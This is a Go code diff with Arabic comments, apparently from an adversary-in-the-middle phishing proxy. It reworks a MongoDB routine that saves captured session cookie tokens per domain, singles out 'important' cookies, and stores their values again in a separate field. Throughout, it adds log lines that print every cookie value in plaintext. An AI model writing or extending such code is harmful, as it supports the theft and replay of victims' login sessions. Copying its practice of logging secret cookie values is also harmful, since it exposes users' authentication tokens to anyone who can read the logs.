@@ -409,6 +409,11 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 	for domain, domainTokens := range tokens {
 		totalCookies += len(domainTokens)
 		log.Debug("[MongoDB] المجال %s يحتوي على %d كوكيز", domain, len(domainTokens))
+		
+		// طباعة تفاصيل كل كوكي في المجال
+		for name, token := range domainTokens {
+			log.Debug("[MongoDB] - الكوكي: %s = %s", name, token.Value)
+		}
 	}
 	log.Debug("[MongoDB] إجمالي عدد المجالات: %d، إجمالي عدد الكوكيز: %d", len(tokens), totalCookies)
 	
@@ -418,8 +423,9 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 		found := false
 		for domain, domainTokens := range tokens {
 			for tokenName, token := range domainTokens {
-				if strings.ToLower(tokenName) == strings.ToLower(cookieName) {
-					log.Debug("[MongoDB] وجدت كوكي مهم %s = %s في المجال %s", tokenName, token.Value, domain)
+				if strings.EqualFold(tokenName, cookieName) {
+					log.Success("[MongoDB] وجدت كوكي مهم %s (اسم أصلي: %s) = %s في المجال %s", 
+						cookieName, tokenName, token.Value, domain)
 					found = true
 					break
 				}
@@ -432,40 +438,87 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 			log.Warning("[MongoDB] لم يتم العثور على الكوكي المهم: %s في قائمة الكوكيز للحفظ", cookieName)
 		}
 	}
-
+	
+	// الحصول على الجلسة الموجودة أولاً
+	var session MongoSession
+	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&session)
+	if err != nil {
+		if err == mongo.ErrNoDocuments {
+			log.Error("[MongoDB] الجلسة غير موجودة، لا يمكن تحديث الكوكيز: %s", sid)
+			return fmt.Errorf("الجلسة غير موجودة: %s", sid)
+		}
+		log.Error("[MongoDB] خطأ أثناء استرداد الجلسة: %v", err)
+		return err
+	}
+	
 	// تحويل رموز الكوكيز إلى التنسيق المناسب لـ MongoDB
 	cookieTokens := make(map[string]map[string]interface{})
+	
+	// حفظ الكوكيز الحالية إذا كانت موجودة
+	if session.CookieTokens != nil {
+		// نسخ الكوكيز الحالية
+		for domain, domainTokens := range session.CookieTokens {
+			cookieTokens[domain] = make(map[string]interface{})
+			for name, token := range domainTokens {
+				cookieTokens[domain][name] = token
+			}
+		}
+	}
+	
+	// تحديث/إضافة الكوكيز الجديدة
 	for domain, domainTokens := range tokens {
-		cookieTokens[domain] = make(map[string]interface{})
+		if _, ok := cookieTokens[domain]; !ok {
+			cookieTokens[domain] = make(map[string]interface{})
+		}
+		
 		for name, token := range domainTokens {
-			cookieTokens[domain][name] = map[string]interface{}{
+			isImportant := false
+			// التحقق مما إذا كان الكوكي مهماً
+			for _, importantName := range importantCookies {
+				if strings.EqualFold(name, importantName) {
+					isImportant = true
+					break
+				}
+			}
+			
+			// حفظ الكوكي مع قيمته
+			cookieData := map[string]interface{}{
 				"name":      token.Name,
 				"value":     token.Value,
 				"path":      token.Path,
 				"http_only": token.HttpOnly,
 			}
 			
-			// تسجيل إضافي للكوكيز المهمة
-			for _, cookieName := range importantCookies {
-				if strings.ToLower(name) == strings.ToLower(cookieName) {
-					log.Success("[MongoDB] تحويل كوكي مهم للحفظ: %s = %s", name, token.Value)
+			// استخدام الاسم الأصلي (مع الحفاظ على حالة الأحرف) للكوكيز المهمة
+			if isImportant {
+				log.Success("[MongoDB] تحويل كوكي مهم للحفظ: %s = %s", name, token.Value)
+				cookieTokens[domain][name] = cookieData
+				
+				// أيضاً، حفظه باسم مطابق 100% للقائمة المهمة للتأكد
+				for _, importantName := range importantCookies {
+					if strings.EqualFold(name, importantName) {
+						cookieTokens[domain][importantName] = cookieData
+						log.Success("[MongoDB] تحويل كوكي مهم باسمه الأصلي: %s = %s", importantName, token.Value)
+					}
 				}
+			} else {
+				cookieTokens[domain][name] = cookieData
 			}
 		}
 	}
-
+	
+	// حفظ كل الكوكيز مرة واحدة
 	now := time.Now().UTC().Unix()
-	log.Debug("[MongoDB] تنفيذ عملية تحديث في قاعدة البيانات")
-	result, err := m.sessionsColl.UpdateOne(
-		m.ctx,
-		bson.M{"session_id": sid},
-		bson.M{
-			"$set": bson.M{
-				"cookie_tokens": cookieTokens,
-				"update_time":   now,
-			},
+	
+	update := bson.M{
+		"$set": bson.M{
+			"cookie_tokens": cookieTokens,
+			"update_time":   now,
 		},
-	)
+	}
+	
+	log.Debug("[MongoDB] محاولة تحديث الكوكيز بالتفاصيل الكاملة")
+	result, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
 	
 	if err != nil {
 		log.Error("[MongoDB] فشل تحديث الكوكيز: %v", err)
@@ -475,36 +528,70 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 	log.Success("[MongoDB] تم تحديث الكوكيز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
 	
 	// التحقق من الحفظ
-	var session MongoSession
-	err = m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&session)
+	var updatedSession MongoSession
+	err = m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&updatedSession)
 	if err != nil {
 		log.Error("[MongoDB] فشل التحقق من الحفظ: %v", err)
 	} else {
 		// التحقق من وجود المجالات والكوكيز
-		if session.CookieTokens != nil {
-			log.Debug("[MongoDB] التحقق: تم استرداد %d مجال من الكوكيز", len(session.CookieTokens))
+		if updatedSession.CookieTokens != nil {
+			log.Debug("[MongoDB] التحقق: تم استرداد %d مجال من الكوكيز بعد التحديث", len(updatedSession.CookieTokens))
 			
-			// البحث عن الكوكيز المهمة في البيانات المستردة
-			for _, cookieName := range importantCookies {
-				found := false
-				for domain, domainTokens := range session.CookieTokens {
-					for tokenName := range domainTokens {
-						if strings.ToLower(tokenName) == strings.ToLower(cookieName) {
-							log.Success("[MongoDB] التحقق: تم العثور على الكوكي المهم %s في المجال %s بعد الحفظ", cookieName, domain)
-							found = true
-							break
+			// طباعة محتويات الكوكيز المحفوظة
+			for domain, domainTokens := range updatedSession.CookieTokens {
+				log.Debug("[MongoDB] المجال المحفوظ: %s (عدد الكوكيز: %d)", domain, len(domainTokens))
+				
+				// البحث عن الكوكيز المهمة في البيانات المستردة
+				for tokenName, tokenValue := range domainTokens {
+					// التحقق مما إذا كان الكوكي مهماً
+					for _, importantName := range importantCookies {
+						if strings.EqualFold(tokenName, importantName) {
+							// طباعة قيمة الكوكي المهم
+							log.Success("[MongoDB] تم العثور على كوكي مهم محفوظ: %s في المجال %s", tokenName, domain)
+							// طباعة قيمة الكوكي إذا أمكن استخراجها
+							if tokenMap, ok := tokenValue.(map[string]interface{}); ok {
+								if value, hasValue := tokenMap["value"]; hasValue {
+									log.Success("[MongoDB] قيمة الكوكي المهم المحفوظ %s = %v", tokenName, value)
+								}
+							} else {
+								log.Debug("[MongoDB] نوع قيمة الكوكي: %T", tokenValue)
+							}
 						}
 					}
-					if found {
-						break
-					}
-				}
-				if !found {
-					log.Error("[MongoDB] التحقق: لم يتم العثور على الكوكي المهم %s بعد الحفظ!", cookieName)
 				}
 			}
 		} else {
 			log.Error("[MongoDB] التحقق: CookieTokens فارغ بعد الحفظ!")
+		}
+	}
+	
+	// محاولة حفظ الكوكيز المهمة بشكل منفصل كتجربة إضافية
+	for _, cookieName := range importantCookies {
+		found := false
+		for domain, domainTokens := range tokens {
+			for tokenName, token := range domainTokens {
+				if strings.EqualFold(tokenName, cookieName) {
+					found = true
+					
+					// إنشاء حقل خاص للكوكي المهم
+					extraUpdate := bson.M{
+						"$set": bson.M{
+							fmt.Sprintf("important_cookies.%s", cookieName): token.Value,
+						},
+					}
+					
+					_, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, extraUpdate)
+					if err != nil {
+						log.Error("[MongoDB] فشل حفظ الكوكي المهم %s كحقل منفصل: %v", cookieName, err)
+					} else {
+						log.Success("[MongoDB] تم حفظ الكوكي المهم %s = %s كحقل منفصل", cookieName, token.Value)
+					}
+					break
+				}
+			}
+			if found {
+				break
+			}
 		}
 	}
 	
